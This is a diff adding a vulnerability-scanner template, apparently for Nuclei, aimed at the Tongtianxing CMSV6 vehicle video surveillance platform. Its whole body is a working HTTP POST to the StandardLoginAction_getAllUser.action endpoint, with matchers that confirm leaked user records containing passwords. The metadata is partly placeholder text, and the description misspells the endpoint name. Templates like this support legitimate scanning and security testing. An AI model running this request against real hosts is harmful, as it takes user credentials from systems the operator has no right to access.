@@ -1,0 +1,31 @@
+id: 808gps-StandardLoginAction-weak
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 通天星CMSV6车载视频监控平台 StandardLoginAction getAlser.acion接口处存在信息泄露漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0getAlser.acion%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /808gps/StandardLoginAction_getAllUser.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+        Connection: close
+        Content-Length: 9
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+
+        json=null
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'infos'
+      - type: word
+        part: body
+        words:
+          - password
